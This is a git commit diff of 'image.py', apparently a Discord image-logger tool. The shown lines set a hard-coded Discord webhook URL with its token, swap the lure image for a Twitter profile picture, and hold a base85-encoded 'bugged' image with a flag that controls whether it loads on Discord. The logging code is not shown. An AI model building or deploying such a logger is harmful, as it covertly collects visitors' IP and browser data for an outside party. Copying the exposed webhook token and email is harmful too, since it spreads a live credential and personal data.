d203d9d0574fbc6a4453cd7697348b052183e6d8
SigmaBoiIdk <anand209961@gmail.com>
2025-08-27 19:37:38 +0800

    Update image.py

--- image.py
+++ image.py
@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1402924271604334663/r8fgsa0AXvxV8LmEYlQ7pnyXVYQk3h4a7JeHFOF9-X-rEDpOm7ZPLh0B1t4VUwNUaJD_'
 
-bindata = httpx.get('https://cdn.discordapp.com/attachments/1081442820931461160/1328750220988645448/huh-dog.gif').content
+bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
